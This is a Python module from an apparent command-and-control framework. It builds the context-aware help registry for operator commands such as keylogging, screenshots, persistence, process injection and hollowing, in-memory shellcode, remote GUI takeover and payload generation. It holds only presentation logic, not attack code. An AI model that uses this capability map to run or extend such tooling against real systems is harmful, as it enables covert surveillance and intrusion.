"""c2_help.py - ONE registry that decides what `help` shows, per context.

The C2 used to answer `help` with a single flat table that mixed listener
commands with commands that only mean anything once a beacon is selected.
An operator in the global context read `screenshot` and `keylog` as available
actions; they are not — they need `interact <id>` first, and finding that out
by trying is how an operator ends up queueing a task against nothing.

The registry makes the three filters explicit and testable instead:

    scope      global | beacon
    requires   what must be true for the command to work
    state      available | blocked | needs-beacon | needs-listener | needs-artefact

It also keeps a single source of truth: adding a command to the C2 means
adding a CommandSpec, and the CLI help, the context filter and the tests all
follow. Nothing here executes anything — it is presentation, and the handlers
stay where they were.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List, Tuple

# ── context keys ────────────────────────────────────────────────────────────
GLOBAL_SCOPE = "global"
BEACON_SCOPE = "beacon"

# ── availability states ─────────────────────────────────────────────────────
AVAILABLE = "available"
NEEDS_BEACON = "needs-beacon"
NEEDS_LISTENER = "needs-listener"
NEEDS_ARTEFACT = "needs-artefact"
NEEDS_REMOTE = "needs-remote"
BLOCKED = "blocked"

_STATE_LABEL = {
    AVAILABLE: "",
    NEEDS_BEACON: "needs a selected beacon (interact <id>)",
    NEEDS_LISTENER: "needs a running listener (listeners start)",
    NEEDS_ARTEFACT: "needs a generated payload (generate)",
    NEEDS_REMOTE: "needs an active remote session (remote)",
    BLOCKED: "unavailable",
}


# ── dispatch kinds ───────────────────────────────────────────────────────────
#: a dedicated do_<handler> method on the shell
HANDLER = "handler"
#: no C2-side handler: the line is queued to the beacon agent verbatim by
#: C2Shell.default(), which is how the agent's own command vocabulary
#: (remote, inject-tl, wlan-scan, ...) reaches the target.
AGENT = "agent"


@dataclass(frozen=True)
class CommandSpec:
    """One C2 command as the help presents it."""

    usage: str
    description: str
    scope: str
    category: str
    #: name of the do_* handler, used to resolve `help <command>` details
    handler: str = ""
    #: HANDLER (C2 implements it) or AGENT (forwarded to the beacon)
    dispatch: str = HANDLER
    #: extra prerequisite beyond the context, evaluated against the shell
    prerequisite: str = AVAILABLE
    #: platform gate, when the command only makes sense on some OS
    platforms: Tuple[str, ...] = ()
    aliases: Tuple[str, ...] = field(default_factory=tuple)

    @property
    def name(self) -> str:
        return self.usage.split()[0].split("|")[0].strip()

    def state_note(self) -> str:
        return _STATE_LABEL.get(self.prerequisite, "")


# ── the registry ────────────────────────────────────────────────────────────
# Kept in the order an operator meets them: infrastructure, then the beacon
# registry, then what you can DO to a beacon, then payloads, then audit.
COMMANDS: List[CommandSpec] = [
    # ── listener & infrastructure ──
    CommandSpec("listeners start [port] [host] [use_ssl]",
                "Start the C2 listener (default HTTPS + mTLS)", GLOBAL_SCOPE,
                "Listener", handler="listeners"),
    CommandSpec("listeners stop", "Stop the C2 listener", GLOBAL_SCOPE,
                "Listener", handler="listeners"),
    CommandSpec("listeners", "Show listener status", GLOBAL_SCOPE,
                "Listener", handler="listeners"),
    CommandSpec("certs [status|uninstall]",
                "Inspect or remove TLS certificate pair", GLOBAL_SCOPE,
                "Listener", handler="certs"),
    CommandSpec("config [status|rotate-api-token|mtls-on|mtls-off]",
                "Show/rotate auto-generated C2 secrets & mTLS toggle",
                GLOBAL_SCOPE, "Listener", handler="config"),
    CommandSpec("malleable [show|save|recommend]",
                "Manage malleable C2 profiles (URIs, UA, headers)", GLOBAL_SCOPE,
                "Listener", handler="malleable"),

    # ── beacon registry ──
    CommandSpec("beacons", "List active beacons with live status", GLOBAL_SCOPE,
                "Beacons", handler="beacons"),
    CommandSpec("interact <id>",
                "Enter a beacon terminal (commands go to the beacon)",
                GLOBAL_SCOPE, "Beacons", handler="interact"),
    CommandSpec("beacon-auth [status|rotate|revoke] [id]",
                "Manage per-beacon HMAC identity keys", GLOBAL_SCOPE, "Beacons",
                handler="beacon_auth"),
    CommandSpec("back", "Return to global C2 context", BEACON_SCOPE,
                "Session", handler="back"),

    # ── session on a beacon ──
    CommandSpec("results [n|all]",
                "Show results for the active beacon", BEACON_SCOPE, "Session",
                handler="results", prerequisite=NEEDS_BEACON),
    CommandSpec("health",
                "Beacon health self-report (uptime, check-ins, tasks, cadence)",
                BEACON_SCOPE, "Session", handler="health", prerequisite=NEEDS_BEACON),
    CommandSpec("set-sleep <ms> [jitter%]",
                "Rotate beacon cadence mid-session (no restart)", BEACON_SCOPE,
                "Session", handler="set_sleep", prerequisite=NEEDS_BEACON),

    # ── collection ──
    CommandSpec("screenshot", "Capture a screenshot on the active beacon",
                BEACON_SCOPE, "Collection", handler="screenshot",
                prerequisite=NEEDS_BEACON, platforms=("windows", "linux", "macos")),
    CommandSpec("keylog start|stop|status|dump",
                "Keystroke logger on the active beacon (dump = retrieve buffer)",
                BEACON_SCOPE, "Collection", handler="keylog",
                prerequisite=NEEDS_BEACON, platforms=("windows", "linux")),
    CommandSpec("wlan-scan | wlan-locate",
                "Wi-Fi survey / locate networks from the beacon",
                BEACON_SCOPE, "Collection", dispatch=AGENT,
                prerequisite=NEEDS_BEACON, platforms=("windows",)),
    CommandSpec("persist [method]",
                "Install persistence (runkey/systemd/cron — auto with autopersist)",
                BEACON_SCOPE, "Collection", handler="persist",
                prerequisite=NEEDS_BEACON),
    CommandSpec("autopersist",
                "Auto-detect OS and install the right persistence",
                BEACON_SCOPE, "Collection", handler="autopersist",
                prerequisite=NEEDS_BEACON),
    CommandSpec("unpersist [name]",
                "Remove the persistence installed by persist/autopersist "
                "(same paths)", BEACON_SCOPE, "Collection",
                handler="unpersist", prerequisite=NEEDS_BEACON),

    # ── beacon lifecycle / advanced ──
    CommandSpec("inject <pid>",
                "Inject a new beacon into an existing process (2 beacons)",
                BEACON_SCOPE, "Advanced", handler="inject",
                prerequisite=NEEDS_BEACON, platforms=("windows",)),
    CommandSpec("inject-tl <pid> | inject-eb <pid>",
                "Thread-layout / early-bird injection variants (agent-side)",
                BEACON_SCOPE, "Advanced", dispatch=AGENT,
                prerequisite=NEEDS_BEACON, platforms=("windows",)),
    CommandSpec("migrate",
                "Hollow a new process and move the beacon (1 beacon)",
                BEACON_SCOPE, "Advanced", handler="migrate",
                prerequisite=NEEDS_BEACON, platforms=("windows",)),
    CommandSpec("mem-run <b64>",
                "Run base64 shellcode in-memory (Windows)", BEACON_SCOPE,
                "Advanced", handler="mem_run", prerequisite=NEEDS_BEACON,
                platforms=("windows",)),

    # ── remote session ──
    CommandSpec("remote [host] [port] [ssl]",
                "Deploy the standalone Remote Session module (GUI takeover)",
                BEACON_SCOPE, "Remote", dispatch=AGENT),
    CommandSpec("remote-view [gui|off]",
                "Browser viewer for the remote stream (gui = full control) or "
                "ASCII watch", BEACON_SCOPE, "Remote", handler="remote_view",
                prerequisite=NEEDS_REMOTE),
    CommandSpec("remote-open",
                "Open the newest full-res remote frame in the image viewer",
                BEACON_SCOPE, "Remote", handler="remote_open",
                prerequisite=NEEDS_REMOTE),
    CommandSpec("screen-watch [gui]",
                "Watch beacon screen recordings: gui = browser player (live + "
                "saved)", BEACON_SCOPE, "Remote", handler="screen_watch",
                prerequisite=NEEDS_BEACON),
    CommandSpec("screen-open [name]",
                "Open a saved screen recording (mp4) in the OS player",
                BEACON_SCOPE, "Remote", handler="screen_open",
                prerequisite=NEEDS_BEACON),

    # ── payloads & delivery ──
    CommandSpec("generate [platform] [--profile <json>]",
                "Compile + dropper (optionally with malleable profile)",
                GLOBAL_SCOPE, "Payloads", handler="generate"),
    CommandSpec("generate-shellcode [platform]",
                "Generate base64 shellcode for inject/migrate/mem-run",
                GLOBAL_SCOPE, "Payloads", handler="generate_shellcode"),
    CommandSpec("payloads", "List generated payloads on disk", GLOBAL_SCOPE,
                "Payloads", handler="payloads"),
    CommandSpec("beacon-help",
                "List ALL commands supported by the beacon agent", GLOBAL_SCOPE,
                "Payloads", handler="beacon_help"),

    # ── ops & audit ──
    CommandSpec("audit [verify|tail N]",
                "Immutable hash-chained C2 audit log (chain-of-custody)",
                GLOBAL_SCOPE, "Audit", handler="audit"),
    CommandSpec("telegram",
                "Telegram bot channel status (remote C2 control)", GLOBAL_SCOPE,
                "Audit", handler="telegram"),
    CommandSpec("exit / quit", "Exit the C2 shell", GLOBAL_SCOPE, "Navigation",
                handler="exit"),
    CommandSpec("help [command]", "Show this help, or details for one command",
                GLOBAL_SCOPE, "Navigation", handler="help"),
]

#: In the global context we still want to know the beacon commands EXIST —
#: hiding them outright is how the old help failed. They are listed with the
#: prerequisite that unlocks them.
#: First spec wins for a name: `listeners start|stop|<status>` are one command
#: with subcommands, so they share a name but have distinct usage strings.
BY_NAME: Dict[str, CommandSpec] = {}
for _spec in COMMANDS:
    BY_NAME.setdefault(_spec.name, _spec)


def commands_for(scope: str, *, include_locked: bool = True
                 ) -> List[CommandSpec]:
    """Commands visible in `scope`, in registry order.

    `include_locked` keeps the beacon commands visible from the global context
    (marked as needing a beacon) instead of hiding them.
    """
    if scope == BEACON_SCOPE:
        return [s for s in COMMANDS if s.scope == BEACON_SCOPE]
    out = [s for s in COMMANDS if s.scope == GLOBAL_SCOPE]
    if include_locked:
        out += [s for s in COMMANDS if s.scope == BEACON_SCOPE]
    return out


def grouped(specs: List[CommandSpec]) -> List[Tuple[str, List[CommandSpec]]]:
    """Group in first-seen category order, so help reads as a workflow."""
    order: List[str] = []
    buckets: Dict[str, List[CommandSpec]] = {}
    for spec in specs:
        if spec.category not in buckets:
            buckets[spec.category] = []
            order.append(spec.category)
        buckets[spec.category].append(spec)
    return [(name, buckets[name]) for name in order]


def is_available(spec: CommandSpec, *, active_beacon: str = "",
                 beacon_os: str = "", listener_up: bool = True,
                 has_remote: bool = False,
                 has_artefact: bool = True) -> bool:
    """Whether the command can actually run right now.

    Deliberately conservative: an unknown prerequisite counts as blocked, so
    a newly added command defaults to "not offered" until its requirement is
    declared. Help that over-promises is the problem being fixed here.
    """
    # Explicitly enumerated, then fail closed: an unrecognised prerequisite
    # means nobody has decided when this command is safe to offer, so it is
    # not offered. The old behaviour (unknown value falling through to
    # "available") is exactly how help starts lying again.
    if spec.prerequisite == AVAILABLE:
        pass
    elif spec.prerequisite == NEEDS_BEACON:
        if not active_beacon:
            return False
    elif spec.prerequisite == NEEDS_REMOTE:
        if not has_remote:
            return False
    elif spec.prerequisite == NEEDS_LISTENER:
        if not listener_up:
            return False
    elif spec.prerequisite == NEEDS_ARTEFACT:
        if not has_artefact:
            return False
    elif spec.prerequisite == BLOCKED:
        return False
    else:
        return False

    # Platform gate: only enforced when we actually know the beacon's OS.
    # Guessing "unsupported" from a missing OS would hide commands that do
    # work, which is its own kind of lie.
    if spec.platforms and beacon_os:
        return beacon_os.lower() in spec.platforms
    return True